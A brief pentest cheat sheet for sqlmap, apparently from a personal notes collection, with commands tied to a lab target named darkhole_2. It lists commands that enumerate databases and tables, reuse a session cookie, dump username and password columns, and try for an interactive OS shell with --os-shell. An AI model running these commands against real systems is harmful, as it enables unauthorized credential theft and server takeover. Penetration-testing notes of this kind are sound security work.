---
desc: Automatic SQL injection and database takeovers
url: https://github.com/sqlmapproject/sqlmap
tags:
- pkg/apt
- tools/pentest
---

# SQLMap - Automatic SQL injection and database takeovers

Enumerate databases:

```bash
sqlmap -u 'URL' --dbs
```

Reuse session cookie:

```bash
sqlmap -u 'URL' --dbs --cookie "PHPSESSID=<cookie ID>"
```

Make `sqlmap` prompt less:

```bash
sqlmap -u 'URL' --batch
```

Enumerate tables of a DB:

```bash
sqlmap -u 'URL' --batch -D darkhole_2 --tables
```

List columns:

```bash
sqlmap -u 'URL' --batch -D darkhole_2 -T users --columns
```

Table fields:

```bash
sqlmap -u 'URL' --batch -D darkhole_2 -T users -C username,password --dump
```

Try get an interactive shell:

```bash
sqlmap -u 'URL' --os-shell --batch
```
